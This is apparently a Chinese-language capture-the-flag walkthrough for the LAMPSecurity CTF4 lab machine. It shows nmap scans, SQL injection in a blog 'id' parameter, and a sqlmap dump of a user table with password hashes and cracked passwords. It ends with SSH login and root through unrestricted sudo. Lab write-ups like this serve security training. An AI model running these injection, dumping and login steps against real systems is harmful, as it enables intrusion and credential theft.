# LAMPSecurity: CTF4

> 本机 IP: 11.11.11.11
>
> 目标 IP: 11.11.11.12
>
> 参考 [wp](https://www.bilibili.com/video/BV1ue4y1S7Zm/) [ctf4_instructions.pdf](#)

## 扫描

```sh
$ sudo nmap --min-rate 10000 -p- 11.11.11.12
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
631/tcp closed ipp

$ sudo nmap -sT -sV -O -p22,25,80,631 11.11.11.12
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
631/tcp closed ipp

$ sudo nmap --script=vuln -p22,25,80,631 11.11.11.12
```

## web&内网

<!-- 搜索框还有xss -->

访问 http://11.11.11.12:80, 在 Blog 中找到页面 URL 为 http://11.11.11.12/index.html?page=blog&title=Blog&id=2

尝试 sql 注入, 加单引号, `http://11.11.11.12/index.html?page=blog&title=Blog&id=2'`, 显示报错 `Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20`, 存在 sql 注入

```sh
$ sqlmap -u 'http://11.11.11.12/index.html?page=blog&title=Blog&id=2' --dbs --dump --batch
available databases [6]:
[*] calendar
[*] ehks
[*] information_schema
[*] mysql
[*] roundcubemail
[*] test
Database: ehks
Table: user
[6 entries]
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+

# ssh dstevens:ilike2surf 登录成功
$ ssh -o HostKeyAlgorithms=ssh-rsa -o KexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@11.11.11.12
[dstevens@ctf4 ~]$ sudo -l
User dstevens may run the following commands on this host:
    (ALL) ALL
[dstevens@ctf4 ~]$ sudo /bin/bash
[root@ctf4 ~]#
```
